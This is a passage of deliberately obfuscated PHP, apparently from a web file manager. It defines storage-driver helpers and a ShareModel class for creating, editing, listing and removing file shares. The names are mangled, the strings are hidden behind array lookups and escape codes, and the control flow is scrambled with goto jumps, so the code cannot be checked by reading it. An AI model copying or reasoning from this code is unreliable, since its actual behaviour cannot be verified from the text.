Model($Fï‡¹Õ¿ğ[739])->set($e›‚š»ãÃŒ, $b×æÙ“šğŞ); goto a¬†ª³ÏÈÀ; c¥­ÖÊğ‡‰: $Fï‡¹Õ¿ğ =& $_SERVER[Ü˜]; $e›‚š»ãÃŒ = $Fï‡¹Õ¿ğ[1179] . ucfirst($BÏÉ¸ğÚµ); $b×æÙ“šğŞ = Model($Fï‡¹Õ¿ğ[739])->get($e›‚š»ãÃŒ); goto e¦õ†ŠÜ˜É; d­æÔ„š‡: } public static function systemFolder($bÂ©Œò­) { $d†Æñ ‘Ë° = IO_PATH_SYSTEM_SOURCE . $bÂ©Œò­; $a¯Ï¶ÀÌÄ¬ = Cache::get($d†Æñ ‘Ë°); if (!$a¯Ï¶ÀÌÄ¬) { $b’“Â”›Ê² = IO::infoFull($d†Æñ ‘Ë°); if (!$b’“Â”›Ê²) { $a¯Ï¶ÀÌÄ¬ = IO::mkdir($d†Æñ ‘Ë°, REPEAT_SKIP); } else { $a¯Ï¶ÀÌÄ¬ = $b’“Â”›Ê²[$_SERVER[Ü˜][86]]; } Cache::set($d†Æñ ‘Ë°, $a¯Ï¶ÀÌÄ¬, 3600 * 10); } return $a¯Ï¶ÀÌÄ¬; } public static function defaultDriver() { return Model($_SERVER[Ü˜][736])->defaultDriver(); } public static function defaultIO() { $b…äáˆĞ±÷ =& $_SERVER[Ü˜]; $D‰‘Éí¨æ = self::defaultDriver(); return $b…äáˆĞ±÷[1180] . $D‰‘Éí¨æ[$b…äáˆĞ±÷[402]] . $b…äáˆĞ±÷[1169]; } public static function defaultDriverInit() { static $d¯­±×Ÿ¯Â = false; if ($d¯­±×Ÿ¯Â) { return $d¯­±×Ÿ¯Â; } $d¯­±×Ÿ¯Â = IO::init(self::defaultIO()); return $d¯­±×Ÿ¯Â; } public static function fileTypeList() { $Bƒ¥ÈÜí‘Æ =& $_SERVER[Ü˜]; $e´Œ‹ëß˜É = $GLOBALS[$Bƒ¥ÈÜí‘Æ[6]][$Bƒ¥ÈÜí‘Æ[1181]]; foreach ($e´Œ‹ëß˜É as $dôÎ‚šÕæ« => $DÇ„’Š‡ªÚ) { $D˜áÕ¿ßé¸ = $Bƒ¥ÈÜí‘Æ[1182] . $dôÎ‚šÕæ«; $e†¹¥ÖŒ“Î = LNG($D˜áÕ¿ßé¸); if ($D˜áÕ¿ßé¸ != $e†¹¥ÖŒ“Î) { $e´Œ‹ëß˜É[$dôÎ‚šÕæ«][$Bƒ¥ÈÜí‘Æ[28]] = $e†¹¥ÖŒ“Î; } } return $e´Œ‹ëß˜É; } public static function transferType($Bé–÷§¯, $BòàÎí‡‡) { goto a†ƒ½ËÊå¡; D™°‡ã¬ƒ: return $b“‹´¹óƒå[1185]; goto aßšœšµ’©; Dë®Öá§õ: if ($dİ®²ƒ‰¢ß[$b“‹´¹óƒå[29]] == $CÙÆ ¾ƒ§¨[$b“‹´¹óƒå[29]] && $dİ®²ƒ‰¢ß[$b“‹´¹óƒå[1183]] == $CÙÆ ¾ƒ§¨[$b“‹´¹óƒå[1183]]) { return $b“‹´¹óƒå[1184]; } if ($dİ®²ƒ‰¢ß[$b“‹´¹óƒå[29]] == $b“‹´¹óƒå[832] && $CÙÆ ¾ƒ§¨[$b“‹´¹óƒå[29]] == $b“‹´¹óƒå[116]) { return $b“‹´¹óƒå[1095]; } if ($dİ®²ƒ‰¢ß[$b“‹´¹óƒå[29]] == $b“‹´¹óƒå[116] && $CÙÆ ¾ƒ§¨[$b“‹´¹óƒå[29]] == $b“‹´¹óƒå[832]) { return $b“‹´¹óƒå[117]; } goto D™°‡ã¬ƒ; a†ƒ½ËÊå¡: $b“‹´¹óƒå =& $_SERVER[Ü˜]; $dİ®²ƒ‰¢ß = self::driverType($Bé–÷§¯); $CÙÆ ¾ƒ§¨ = self::driverType($BòàÎí‡‡); goto Dë®Öá§õ; aßšœšµ’©: } public static function driverType($Få²˜Ã–èã) { goto Dåå²½Í¦•; dÏ³·¿Ñóõ: return array($C£‹›¢Ûóù[29] => $C£‹›¢Ûóù[832], $C£‹›¢Ûóù[1183] => $Få²˜Ã–èã->pathDriver, $C£‹›¢Ûóù[86] => $F†ÍôÕÁ¬); goto dÍ„ùï¾ßÑ; c‚‚…¸å‰: if ($D¢£•¨ç–Û == $C£‹›¢Ûóù[727] || $D¢£•¨ç–Û == $C£‹›¢Ûóù[1187] || $D¢£•¨ç–Û == $C£‹›¢Ûóù[1188]) { $Få²˜Ã–èã = self::defaultDriverInit(); } else { if ($D¢£•¨ç–Û == $C£‹›¢Ûóù[1102] || $D¢£•¨ç–Û == $C£‹›¢Ûóù[1189]) { $Få²˜Ã–èã = IO::init($Få²˜Ã–èã->pathParse[$C£‹›¢Ûóù[1049]]); } } $D¢£•¨ç–Û = str_replace($C£‹›¢Ûóù[1186], $C£‹›¢Ûóù[33], strtolower($Få²˜Ã–èã->getType())); if ($D¢£•¨ç–Û == $C£‹›¢Ûóù[116]) { return array($C£‹›¢Ûóù[29] => $C£‹›¢Ûóù[116], $C£‹›¢Ûóù[1183] => $C£‹›¢Ûóù[33], $C£‹›¢Ûóù[86] => $F†ÍôÕÁ¬); } goto dÏ³·¿Ñóõ; Dåå²½Í¦•: $C£‹›¢Ûóù =& $_SERVER[Ü˜]; $F†ÍôÕÁ¬ = $Få²˜Ã–èã->path; $D¢£•¨ç–Û = str_replace($C£‹›¢Ûóù[1186], $C£‹›¢Ûóù[33], strtolower($Få²˜Ã–èã->getType())); goto c‚‚…¸å‰; dÍ„ùï¾ßÑ: } } goto FÂó˜ÕîËÇ; a„®¾çİ‘: class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\162\x65"; protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\171\124\x69\x6d\x65", "\164\151\155\145", "\x69\156\x73\x65\x72\164\x2c\165\x70\144\141\164\x65", "\146\x75\x6e\143\x74\x69\157\156"), array("\143\x72\x65\141\x74\x65\x54\x69\x6d\x65", "\x74\151\x6d\145", "\151\x6e\x73\145\162\164", "\146\165\156\143\164\x69\x6f\x6e"), array("\157\160\164\151\x6f\156\163", '', "\151\x6e\163\145\162\164\54\x75\160\x64\141\x74\x65\x2c\163\x65\154\x65\143\x74", "\x6a\x73\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($d¹×˜Õƒ“ƒ) { $C¥˜Ããß =& $_SERVER[Ü˜]; $fî¬É£¹Ïõ = isset($d¹×˜Õƒ“ƒ[0]) ? $d¹×˜Õƒ“ƒ[0] : !1; return array($C¥˜Ããß[1821] => array(USER_ID, $C¥˜Ããß[1822]), $C¥˜Ããß[1765] => array($fî¬É£¹Ïõ, $C¥˜Ããß[1823])); } protected function listSimple() { $d“İÁ½·ËŠ = array($_SERVER[Ü˜][1529] => USER_ID); $BÊ×˜™É·° = $this->field($this->fieldList)->where($d“İÁ½·ËŠ)->select(); return $BÊ×˜™É·° ? $BÊ×˜™É·° : array(); } protected function getInfo($E¾œÆÃ¸×, $a–º‚ù¢ã = false) { $bÙïë¯’› =& $_SERVER[Ü˜]; if ($a–º‚ù¢ã) { return $this->_getShareInfo(array($bÙïë¯’›[477] => $E¾œÆÃ¸×)); } $C¥Ãà¹ó¥– = $this->cacheFunctionGet($bÙïë¯’›[1772], $E¾œÆÃ¸×); return $C¥Ãà¹ó¥–; } public function getInfoByHash($a„áÆ  £¥) { return $this->_getShareInfo(array($_SERVER[Ü˜][479] => $a„áÆ  £¥)); } public function getInfoByPath($bøéßùåéù) { $Ağğ¹‚¾“ó =& $_SERVER[Ü˜]; $CÛà¿¼è Ï = array($Ağğ¹‚¾“ó[1529] => USER_ID, $Ağğ¹‚¾“ó[404] => $bøéßùåéù); return $this->_getShareInfo($CÛà¿¼è Ï); } public function getInfoBySourcePath($F‹†÷Ë¯¬) { $C”ºÄÑ£‚° =& $_SERVER[Ü˜]; $A×õÅ›â¯÷ = array($C”ºÄÑ£‚°[1529] => USER_ID, $C”ºÄÑ£‚°[1072] => $F‹†÷Ë¯¬); return $this->_getShareInfo($A×õÅ›â¯÷); } private function _getShareInfo($e¹¯¨ Æ¾ö) { goto A¼µƒŒß®; A¼µƒŒß®: $DÛ™º¤Œ‘ =& $_SERVER[Ü˜]; $EÔÏÂ„È×ë = $this->where($e¹¯¨ Æ¾ö)->find(); if (!$EÔÏÂ„È×ë) { return !1; } goto AŞ„Õ††; AŞ„Õ††: $e¹¯¨ Æ¾ö = array($DÛ™º¤Œ‘[477] => $EÔÏÂ„È×ë[$DÛ™º¤Œ‘[477]]); $dÌ®¸Ê¨ÅŒ = $DÛ™º¤Œ‘[1824]; $bÃÛŒ‹Ï‡ = Model($DÛ™º¤Œ‘[573])->order($DÛ™º¤Œ‘[402])->field($dÌ®¸Ê¨ÅŒ)->where($e¹¯¨ Æ¾ö)->select(); goto A¯„Å¾¼‚°; A¯„Å¾¼‚°: if ($EÔÏÂ„È×ë[$DÛ™º¤Œ‘[404]] == $DÛ™º¤Œ‘[201]) { $EÔÏÂ„È×ë[$DÛ™º¤Œ‘[95]] = IO::info($EÔÏÂ„È×ë[$DÛ™º¤Œ‘[1072]]); } else { $EÔÏÂ„È×ë[$DÛ™º¤Œ‘[95]] = Model($DÛ™º¤Œ‘[1207])->pathInfo($EÔÏÂ„È×ë[$DÛ™º¤Œ‘[404]]); } $EÔÏÂ„È×ë[$DÛ™º¤Œ‘[1825]] = $bÃÛŒ‹Ï‡; return $EÔÏÂ„È×ë; goto FŞïŠ·Ÿ·±; FŞïŠ·Ÿ·±: } protected function getInfoAuth($cêšš’ºØ) { $eİÛÏ¾˜ =& $_SERVER[Ü˜]; $CÒö’ö“” = $this->getInfo($cêšš’ºØ); $CÒö’ö“”[$eİÛÏ¾˜[415]] = Model($eİÛÏ¾˜[491])->authMake($CÒö’ö“”[$eİÛÏ¾˜[1825]]); return $CÒö’ö“”; } protected function listData($BÔÍõĞÚÄ¹ = null, $d·Ç¼õÃË« = 300) { $F´Ûš¤Ã’ =& $_SERVER[Ü˜]; $FÏ‹ğš¨Ë½ = array(array($F´Ûš¤Ã’[482] => array($F´Ûš¤Ã’[970], 0), $F´Ûš¤Ã’[484] => array($F´Ûš¤Ã’[970], 0), $F´Ûš¤Ã’[1826] => $F´Ûš¤Ã’[1780])); if ($BÔÍõĞÚÄ¹ == $F´Ûš¤Ã’[1827]) { $FÏ‹ğš¨Ë½ = array($F´Ûš¤Ã’[482] => 1); } else { if ($BÔÍõĞÚÄ¹ == $F´Ûš¤Ã’[1057]) { $FÏ‹ğš¨Ë½ = array($F´Ûš¤Ã’[484] => 1); } } $FÏ‹ğš¨Ë½[$F´Ûš¤Ã’[1529]] = USER_ID; $FŸËèØŞî = $this->where($FÏ‹ğš¨Ë½)->selectPage($d·Ç¼õÃË«); return $FŸËèØŞî; } protected function listToMe($FÂÔ¶ğÖå = 300) { goto BÉĞ¡ŠëÊ—; DĞÊ“ÀÁ´: if (!$Cø§Œ‡’) { return $B±ÏÑœˆ÷ç; } $DÆ¶¡¢šµŞ = $F™Š²ìì¦“[1829]; $Aôãš„Ã‘ = array($F™Š²ìì¦“[477] => array($F™Š²ìì¦“[420], array_keys($Cø§Œ‡’))); goto dåèÇÖá¿í; Fğ„ŒÛšÈë: if ($Eª÷™Äóƒ¯) { $Aôãš„Ã‘ = array(array($F™Š²ìì¦“[558] => SourceModel::TYPE_USER, $F™Š²ìì¦“[493] => USER_ID), array($F™Š²ìì¦“[558] => SourceModel::TYPE_GROUP, $F™Š²ìì¦“[493] => array($F™Š²ìì¦“[7], $Eª÷™Äóƒ¯)), $F™Š²ìì¦“[1826] => $F™Š²ìì¦“[1780]); } $B±ÏÑœˆ÷ç = Model($F™Š²ìì¦“[573])->where($Aôãš„Ã‘)->selectPage($FÂÔ¶ğÖå); $Cø§Œ‡’ = array_to_keyvalue_group($B±ÏÑœˆ÷ç[$F™Š²ìì¦“[376]], $F™Š²ìì¦“[477]); goto DĞÊ“ÀÁ´; BÉĞ¡ŠëÊ—: $F™Š²ìì¦“ =& $_SERVER[Ü˜]; $Eª÷™Äóƒ¯ = Model($F™Š²ìì¦“[1828])->userGroupParents(USER_ID); $Aôãš„Ã‘ = array($F™Š²ìì¦“[558] => SourceModel::TYPE_USER, $F™Š²ìì¦“[493] => USER_ID); goto Fğ„ŒÛšÈë; dåèÇÖá¿í: $d’èÀˆš  = $this->field($DÆ¶¡¢šµŞ)->where($Aôãš„Ã‘)->select(); foreach ($d’èÀˆš  as $e²¶Óá¼ => &$e„‘«ÆÁ´) { $e„‘«ÆÁ´[$F™Š²ìì¦“[1825]] = $Cø§Œ‡’[$e„‘«ÆÁ´[$F™Š²ìì¦“[477]]]; } unset($e„‘«ÆÁ´); goto c¸æ¢Èšâ; c¸æ¢Èšâ: $fØÇ±•Ó¶£ = array($F™Š²ìì¦“[1830] => $d’èÀˆš , $F™Š²ìì¦“[1831] => $B±ÏÑœˆ÷ç[$F™Š²ìì¦“[373]]); return $fØÇ±•Ó¶£; goto dò…íëÇ¼Ø; dò…íëÇ¼Ø: } protected function shareAdd($a“„‘†”Ñí, $dãŸƒî×È) { $d°›¶ÕçŸ¯ =& $_SERVER[Ü˜]; $F§‰¯ŸêÌì = $this->_addShareData($a“„‘†”Ñí, $dãŸƒî×È); if (!empty($dãŸƒî×È[$d°›¶ÕçŸ¯[1832]])) { $this->_shareAuthSet($F§‰¯ŸêÌì, $dãŸƒî×È[$d°›¶ÕçŸ¯[1832]]); } $this->shareEventAdd($a“„‘†”Ñí, $dãŸƒî×È, $d°›¶ÕçŸ¯[1060]); return $F§‰¯ŸêÌì; } private function shareEventAdd($EÁ¦ŞâÄ–, $cË‹²Òğ¦Ì, $B×¾¦§¥ = "\141\x64\x64") { goto f¸†‘Ã½á•; e÷ßàêÁœ: if ($D“öòºí˜¦[$c–‚Á±Æ˜[482]] == $c–‚Á±Æ˜[97] && $cË‹²Òğ¦Ì[$c–‚Á±Æ˜[482]] == $c–‚Á±Æ˜[201]) { $D­²Ğ†í­­ = $c–‚Á±Æ˜[1836]; } if ($D“öòºí˜¦[$c–‚Á±Æ˜[484]] == $c–‚Á±Æ˜[201] && $cË‹²Òğ¦Ì[$c–‚Á±Æ˜[484]] == $c–‚Á±Æ˜[97]) { $D­²Ğ†í­­ = $c–‚Á±Æ˜[1834]; } if ($D“öòºí˜¦[$c–‚Á±Æ˜[484]] == $c–‚Á±Æ˜[97] && $cË‹²Òğ¦Ì[$c–‚Á±Æ˜[484]] == $c–‚Á±Æ˜[201]) { $D­²Ğ†í­­ = $c–‚Á±Æ˜[1837]; } goto CÅ¨ºœ´ç; A¼˜ÒÙ¨Íç: $D“öòºí˜¦ = $this->getInfoByPath($EÁ¦ŞâÄ–); $D­²Ğ†í­­ = $c–‚Á±Æ˜[1835]; if ($D“öòºí˜¦[$c–‚Á±Æ˜[482]] == $c–‚Á±Æ˜[201] && $cË‹²Òğ¦Ì[$c–‚Á±Æ˜[482]] == $c–‚Á±Æ˜[97]) { $D­²Ğ†í­­ = $c–‚Á±Æ˜[1833]; } goto e÷ßàêÁœ; f¸†‘Ã½á•: $c–‚Á±Æ˜ =& $_SERVER[Ü˜]; if (!$EÁ¦ŞâÄ– || $EÁ¦ŞâÄ– == $c–‚Á±Æ˜[201]) { return; } if ($B×¾¦§¥ == $c–‚Á±Æ˜[1060]) { if ($cË‹²Òğ¦Ì[$c–‚Á±Æ˜[482]] == $c–‚Á±Æ˜[97]) { Model($c–‚Á±Æ˜[542])->eventShare($EÁ¦ŞâÄ–, $c–‚Á±Æ˜[1833]); } if ($cË‹²Òğ¦Ì[$c–‚Á±Æ˜[484]] == $c–‚Á±Æ˜[97]) { Model($c–‚Á±Æ˜[542])->eventShare($EÁ¦ŞâÄ–, $c–‚Á±Æ˜[1834]); } return; } goto A¼˜ÒÙ¨Íç; CÅ¨ºœ´ç: Model($c–‚Á±Æ˜[542])->eventShare($EÁ¦ŞâÄ–, $D­²Ğ†í­­); return; goto a”¯¾˜¢¢„; a”¯¾˜¢¢„: } private function _addShareData($d¸„—­î¦Ã, $FÉÔ·ÌÆ„¾ = array()) { goto a„ƒóö–‘¡; a„ƒóö–‘¡: $b› ğ½¶½Œ =& $_SERVER[Ü˜]; $bë Æ‚à‹ª = array($b› ğ½¶½Œ[419] => $d¸„—­î¦Ã, $b› ğ½¶½Œ[1521] => USER_ID); if ($d¸„—­î¦Ã == 0) { $bë Æ‚à‹ª = array($b› ğ½¶½Œ[1838] => $FÉÔ·ÌÆ„¾[$b› ğ½¶½Œ[1072]], $b› ğ½¶½Œ[1521] => USER_ID); } goto EŠ”îŠĞğ®; e¹Ö—ğôÃ: $Få©¿çí› = $this->add($FƒŒ˜ÅïŒ); $Aš“ÚÇ‰Åã = array($b› ğ½¶½Œ[479] => short_id($Få©¿çí›)); $this->where(array($b› ğ½¶½Œ[476] => $Få©¿çí›))->save($Aš“ÚÇ‰Åã); goto eŒÕÆ‚†áÔ; EŠ”îŠĞğ®: if ($F¨µƒŠË¼Ã = $this->where($bë Æ‚à‹ª)->find()) { return $F¨µƒŠË¼Ã[$b› ğ½¶½Œ[477]]; } if ($d¸„—­î¦Ã == 0) { $bËê°µ = array($b› ğ½¶½Œ[28] => get_path_this($FÉÔ·ÌÆ„¾[$b› ğ½¶½Œ[86]])); } else { $bËê°µ = Model($b› ğ½¶½Œ[799])->sourceInfo($d¸„—­î¦Ã); if (!$bËê°µ) { return !1; } } if (!$FÉÔ·ÌÆ„¾[$b› ğ½¶½Œ[1435]]) { $FÉÔ·ÌÆ„¾[$b› ğ½¶½Œ[1435]] = $bËê°µ[$b› ğ½¶½Œ[28]]; } goto c‚±²â‡Ù; c‚±²â‡Ù: $FƒŒ˜ÅïŒ = array($b› ğ½¶½Œ[1521] => USER_ID, $b› ğ½¶½Œ[419] => $d¸„—­î¦Ã, $b› ğ½¶½Œ[1435] => $b› ğ½¶½Œ[33], $b› ğ½¶½Œ[482] => 0, $b› ğ½¶½Œ[484] => 0, $b› ğ½¶½Œ[1072] => $b› ğ½¶½Œ[33], $b› ğ½¶½Œ[314] => $b› ğ½¶½Œ[33], $b› ğ½¶½Œ[850] => $b› ğ½¶½Œ[33], $b› ğ½¶½Œ[1839] => 0, $b› ğ½¶½Œ[1840] => 0, $b› ğ½¶½Œ[485] => 0, $b› ğ½¶½Œ[486] => $b› ğ½¶½Œ[33], $b› ğ½¶½Œ[479] => $b› ğ½¶½Œ[33]); $Dä»ì‚Î×Ø = explode($b› ğ½¶½Œ[47], $b› ğ½¶½Œ[1841]); foreach ($Dä»ì‚Î×Ø as $E¤­´Íè´) { if (!isset($FÉÔ·ÌÆ„¾[$E¤­´Íè´])) { continue; } $FƒŒ˜ÅïŒ[$E¤­´Íè´] = $FÉÔ·ÌÆ„¾[$E¤­´Íè´]; } goto e¹Ö—ğôÃ; eŒÕÆ‚†áÔ: return $Få©¿çí›; goto cãµïÈ×ï; cãµïÈ×ï: } private function _shareAuthSet($D¨øô…éË…, $e§ˆ„£ï­—) { goto EÍˆÛ°…áÙ; fÆ—µÍæÃÄ: $E‹Ó¬Ì­£Á->where(array($FÛ×£çæ­â[477] => $D¨øô…éË…))->delete(); $Cöø³Ùö¡ = array(); foreach ($e§ˆ„£ï­— as $dÚƒ×À‹Â®) { $C¤ç•°ÄíÍ = SourceModel::TYPE_USER; if ($dÚƒ×À‹Â®[$FÛ×£çæ­â[413]] == SourceModel::TYPE_GROUP) { $C¤ç•°ÄíÍ = SourceModel::TYPE_GROUP; } $d¡½²äÁš³ = array($FÛ×£çæ­â[477] => $D¨øô…éË…, $FÛ×£çæ­â[413] => $C¤ç•°ÄíÍ, $FÛ×£çæ­â[493] => intval($dÚƒ×À‹Â®[$FÛ×£çæ­â[493]]), $FÛ×£çæ­â[1788] => 0, $FÛ×£çæ­â[1842] => -1); if ($dÚƒ×À‹Â®[$FÛ×£çæ­â[1788]]) { $d¡½²äÁš³[$FÛ×£çæ­â[1788]] = $dÚƒ×À‹Â®[$FÛ×£çæ­â[1788]]; } else { if ($dÚƒ×À‹Â®[$FÛ×£çæ­â[1842]]) { $d¡½²äÁš³[$FÛ×£çæ­â[1842]] = $dÚƒ×À‹Â®[$FÛ×£çæ­â[1842]]; } } $Cöø³Ùö¡[] = $d¡½²äÁš³; } goto c™…°²¯ÍÃ; c™…°²¯ÍÃ: return $E‹Ó¬Ì­£Á->addAll($Cöø³Ùö¡, array(), !0); goto C—¸‚’ä¸; EÍˆÛ°…áÙ: $FÛ×£çæ­â =& $_SERVER[Ü˜]; if (!is_array($e§ˆ„£ï­—)) { return !1; } $E‹Ó¬Ì­£Á = Model($FÛ×£çæ­â[1792]); goto fÆ—µÍæÃÄ; C—¸‚’ä¸: } public function numViewAdd($eöÅŒÁ¦´) { $B½Å”«×š =& $_SERVER[Ü˜]; $C¾•ïç¢ä = array($B½Å”«×š[476] => $eöÅŒÁ¦´); $this->where($C¾•ïç¢ä)->setAdd($B½Å”«×š[1839]); } public function numDownloadAdd($bÕôÛÛ®ßÀ) { $a¯½»Ä¥Ô =& $_SERVER[Ü˜]; $CöÄäâÔ„ = array($a¯½»Ä¥Ô[476] => $bÕôÛÛ®ßÀ); $this->where($CöÄäâÔ„)->setAdd($a¯½»Ä¥Ô[1840]); } protected function shareEdit($CÉ°Ü¡ Ì, $AŠ°¥Î¦Ä·) { goto aÓŒ¦ŠñŒ; B¦Š¼ å: foreach ($aÆÅ£™Ì˜ as $BÜ÷ğÄó‰•) { if (!array_key_exists($BÜ÷ğÄó‰•, $AŠ°¥Î¦Ä·)) { continue; } $D°Õİ¸ä[$BÜ÷ğÄó‰•] = $AŠ°¥Î¦Ä·[$BÜ÷ğÄó‰•]; } $this->shareEventAdd($açç¾§ÇÓ¹[$F™„õÔ ì[404]], $AŠ°¥Î¦Ä·, $F™„õÔ ì[1660]); $this->where(array($F™„õÔ ì[476] => $CÉ°Ü¡ Ì))->save($D°Õİ¸ä); goto eƒ‰»·­‰; d‰Ãº²±¹: $this->_checkLinkShare($AŠ°¥Î¦Ä·, $açç¾§ÇÓ¹); $D°Õİ¸ä = array(); $aÆÅ£™Ì˜ = explode($F™„õÔ ì[47], $F™„õÔ ì[1843]); goto B¦Š¼ å; aÓŒ¦ŠñŒ: $F™„õÔ ì =& $_SERVER[Ü˜]; $açç¾§ÇÓ¹ = $this->getInfo($CÉ°Ü¡ Ì); if (!$açç¾§ÇÓ¹) { return !1; } goto d‰Ãº²±¹; eƒ‰»·­‰: if (isset($AŠ°¥Î¦Ä·[$F™„õÔ ì[1832]])) { $this->_shareAuthSet($CÉ°Ü¡ Ì, $AŠ°¥Î¦Ä·[$F™„õÔ ì[1832]]); } return !0; goto d”À­Û”«£; d”À­Û”«£: } private function _checkLinkShare($CĞŠù´¥Â, $aˆç¾Ÿê•…) { goto cšâõÏˆ‚; d¦×ˆõ¿Í: $bæÍÅ²…¥Ù = $this->shareFileMeta($Eæ²É ¹“[$a–èèÕµù”[456]]); if (isset($bæÍÅ²…¥Ù[$a–èèÕµù”[381]]) && $bæÍÅ²…¥Ù[$a–èèÕµù”[381]] == $a–èèÕµù”[97]) { show_json(LNG($a–èèÕµù”[1846]), !1); } goto A¹ĞæÈ„ÅÑ; cšâõÏˆ‚: $a–èèÕµù” =& $_SERVER[Ü˜]; if ($CĞŠù´¥Â[$a–èèÕµù”[482]] != $a–èèÕµù”[97]) { return; } $dæíë‘å£ƒ = $aˆç¾Ÿê•…[$a–èèÕµù”[95]][$a–èèÕµù”[404]]; goto eæÎæèãò; eæÎæèãò: if ($aˆç¾Ÿê•…[$a–èèÕµù”[95]][$a–èèÕµù”[29]] != $a–èèÕµù”[203]) { $e“ÕÛÉèø = $this->_folderReport($dæíë‘å£ƒ); if (!$e“ÕÛÉèø) { return; } show_json(LNG($a–èèÕµù”[1844]) . $a–èèÕµù”[1845] . $e“ÕÛÉèø, !1); } $Eæ²É ¹“ = Model($a–èèÕµù”[799])->fileInfoGet($aˆç¾Ÿê•…[$a–èèÕµù”[95]][$a–èèÕµù”[404]]); if (!$Eæ²É ¹“) { return; } goto d¦×ˆõ¿Í; A¹ĞæÈ„ÅÑ: } private function _folderReport($D¹ÓÒèÁà) { goto Bß‹©À—¨á; CÀë¡ÕŸğŠ: $b‹¯¶õ’ = array($bØà ›É…°[456] => array($bØà ›É…°[7], $fò§òŞ¶â£), $bØà ›É…°[496] => array($bØà ›É…°[389], "\x25{$c˜ÙŒ¾¼Ù}\x25"), $bØà ›É…°[432] => 0); $FæŸ´õøŸŸ = Model($bØà ›É…°[799])->where($b‹¯¶õ’)->field($bØà ›É…°[1848])->find(); if (!$FæŸ´õøŸŸ) { return !1; } goto cŸìùôïñ; eÙƒ¯ƒ‰¥™: $aöÕ±•ê»× = array_to_keyvalue($då¿¸œí˜è, $bØà ›É…°[33], $bØà ›É…°[28]); $aöÕ±•ê»×[] = $FæŸ´õøŸŸ[$bØà ›É…°[28]]; return implode($bØà ›É…°[8], $aöÕ±•ê»×); goto bÄ ©ùÇƒÔ; b›–´ÒÉŞÜ: if (!$fò§òŞ¶â£) { return !1; } $fò§òŞ¶â£ = array_to_keyvalue($fò§òŞ¶â£, $bØà ›É…°[33], $bØà ›É…°[456]); $c˜ÙŒ¾¼Ù = $bØà ›É…°[47] . $D¹ÓÒèÁà . $bØà ›É…°[47]; goto CÀë¡ÕŸğŠ; cŸìùôïñ: $dÉó­÷İ£ = substr($FæŸ´õøŸŸ[$bØà ›É…°[496]], strpos($FæŸ´õøŸŸ[$bØà ›É…°[496]], $c˜ÙŒ¾¼Ù)); $b‹¯¶õ’ = array($bØà ›É…°[404] => array($bØà ›É…°[7], trim($dÉó­÷İ£, $bØà ›É…°[47]))); $då¿¸œí˜è = Model($bØà ›É…°[799])->where($b‹¯¶õ’)->field($bØà ›É…°[28])->select(); goto eÙƒ¯ƒ‰¥™; Bß‹©À—¨á: $bØà ›É…° =& $_SERVER[Ü˜]; $b‹¯¶õ’ = array($bØà ›É…°[456] => array($bØà ›É…°[970], 0), $bØà ›É…°[719] => 3); $fò§òŞ¶â£ = Model($bØà ›É…°[1847])->where($b‹¯¶õ’)->field($bØà ›É…°[456])->select(); goto b›–´ÒÉŞÜ; bÄ ©ùÇƒÔ: } protected function remove($F‹ÕÕŠìåƒ) { goto d•³¶Úƒ’°; F¿ô‚™Ùã¢: for ($Aç¥™–ìêö = 0; $Aç¥™–ìêö < count($EöÕøƒĞ´); $Aç¥™–ìêö++) { $fÄİÔš Ü³ = $this->getInfo($EöÕøƒĞ´[$Aç¥™–ìêö]); if ($fÄİÔš Ü³[$e‹ìÊô§ìä[484]] == $e‹ìÊô§ìä[97]) { Model($e‹ìÊô§ìä[542])->eventShare($fÄİÔš Ü³[$e‹ìÊô§ìä[404]], $e‹ìÊô§ìä[1837]); } if ($fÄİÔš Ü³[$e‹ìÊô§ìä[482]] == $e‹ìÊô§ìä[97]) { Model($e‹ìÊô§ìä[542])->eventShare($fÄİÔš Ü³[$e‹ìÊô§ìä[404]], $e‹ìÊô§ìä[1836]); } } return $eé¸ƒä´ãÙ; goto F·¯‹¶Ô‰¥; B–›²ÈŸ«: $eé¸ƒä´ãÙ = $this->where($c°º®¿¢é™)->delete(); if ($eé¸ƒä´ãÙ) { Model($e‹ìÊô§ìä[573])->where(array($e‹ìÊô§ìä[477] => $F‹ÕÕŠìåƒ))->delete(); } $EöÕøƒĞ´ = is_array($F‹ÕÕŠìåƒ) ? $F‹ÕÕŠìåƒ[1] : array($F‹ÕÕŠìåƒ); goto F¿ô‚™Ùã¢; d•³¶Úƒ’°: $e‹ìÊô§ìä =& $_SERVER[Ü˜]; if (is_array($F‹ÕÕŠìåƒ)) { $F‹ÕÕŠìåƒ = array($e‹ìÊô§ìä[7], $F‹ÕÕŠìåƒ); } $c°º®¿¢é™ = array($e‹ìÊô§ìä[477] => $F‹ÕÕŠìåƒ); goto B–›²ÈŸ«; F·¯‹¶Ô‰¥: } protected function removeBySource($fÅ„½‰Ğø) { goto BÚ±¶¡Ä×®; F˜Ş‹Ë¶Õ: $this->where($Eœç“·Œ•ì)->delete(); Model($BÕ¦–ÑÆÏø[573])->where($Eœç“·Œ•ì)->delete(); goto dö‚„Š‚Û°; Eë—‹¥ÔÃ½: $FãùØ‚áóÇ = array_to_keyvalue($FãùØ‚áóÇ, $BÕ¦–ÑÆÏø[33], $BÕ¦–ÑÆÏø[477]); if (!$FãùØ‚áóÇ) { return; } $Eœç“·Œ•ì = array($BÕ¦–ÑÆÏø[476] => array($BÕ¦–ÑÆÏø[420], $FãùØ‚áóÇ)); goto F˜Ş‹Ë¶Õ; BÚ±¶¡Ä×®: $BÕ¦–ÑÆÏø =& $_SERVER[Ü˜]; $Eœç“·Œ•ì = array($BÕ¦–ÑÆÏø[419] => array($BÕ¦–ÑÆÏø[420], $fÅ„½‰Ğø)); $FãùØ‚áóÇ = $this->field($BÕ¦–ÑÆÏø[477])->where($Eœç“·Œ•ì)->select(); goto Eë—‹¥ÔÃ½; dö‚„Š‚Û°: } public function listAll($fó“‹¬½ÀÕ) { goto dô„®”î’ñ; bëâº‰‘ÅŒ: if ($fó“‹¬½ÀÕ[$a ”â„’¤ƒ[730]]) { $f·øß¸Èå½ = $fó“‹¬½ÀÕ[$a ”â„’¤ƒ[485]] ? $fó“‹¬½ÀÕ[$a ”â„’¤ƒ[485]] : strtotime(date($a ”â„’¤ƒ[1849])); $A±æÁ²ã±ª[$a ”â„’¤ƒ[204]] = array($a ”â„’¤ƒ[340], array($fó“‹¬½ÀÕ[$a ”â„’¤ƒ[730]], $f·øß¸Èå½)); } if ($fó“‹¬½ÀÕ[$a ”â„’¤ƒ[29]]) { $A±æÁ²ã±ª[$fó“‹¬½ÀÕ[$a 